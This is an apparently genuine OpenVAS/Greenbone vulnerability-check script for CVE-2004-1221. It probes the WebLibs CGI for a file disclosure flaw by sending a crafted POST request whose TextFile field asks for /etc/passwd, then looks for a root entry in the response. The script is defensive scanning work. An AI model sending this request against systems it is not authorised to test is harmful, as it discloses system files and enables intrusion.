# SPDX-FileCopyrightText: 2004 Noam Rathaus
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.16168");
  script_version("2025-07-18T15:43:33+0000");
  script_tag(name:"last_modification", value:"2025-07-18 15:43:33 +0000 (Fri, 18 Jul 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2004-1221");
  script_name("WebLibs File Disclosure Vulnerability (Dec 2004) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2004 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "os_detection.nasl",
                      "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  # nb: Initial version of this VT only checked /etc/passwd which indicates that this product is
  # only running on Linux. As it doesn't make much sense to throw these checks against every OS
  # these days a more Linux specific mandatory key is used here.
  script_mandatory_keys("Host/runs_unixoide");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210121162731/http://www.securityfocus.com/bid/11848");

  script_tag(name:"summary", value:"WebLibs is prone to a file disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"impact", value:"Due to incorrect parsing of incoming data, an attacker can cause
  the CGI to return arbitrary files as the result of the CGI.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );

useragent = http_get_user_agent();
host = http_host_name( port:port );

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  url = dir + "/weblibs.pl";

  # nb: No traversal_files() for now as we don't want to change the code below as we don't have
  # access to an affected system anymore and can't test any changes done here.
  req = string( "POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "User-Agent: ", useragent, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: 372\r\n",
                "\r\n",
                "TextFile=%2Fetc%2Fpasswd&Adjective+%231=a&Adjective+%232=a&Adjective+%233=a&Adjective+%234=a&Adjective+%235=a&Highland+Games+such+as+Stone+Mountain=a&Man%27s+Name=a&Noun+%231=a&Noun+%232=a&Noun+%233=a&Noun+%234=a&Noun+%235=a&Noun+%236=a&Noun+%237=a&Noun+%238=a&Plural+Noun+%231=a&Plural+Noun+%232=a&Plural+Noun+%233=a&Plural+Noun+%234=a&Plural+Noun+%235=a&Woman%27s+Name=a" );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

  if( egrep( pattern:"root:.*:0:[01]:.*", string:res, icase:FALSE ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
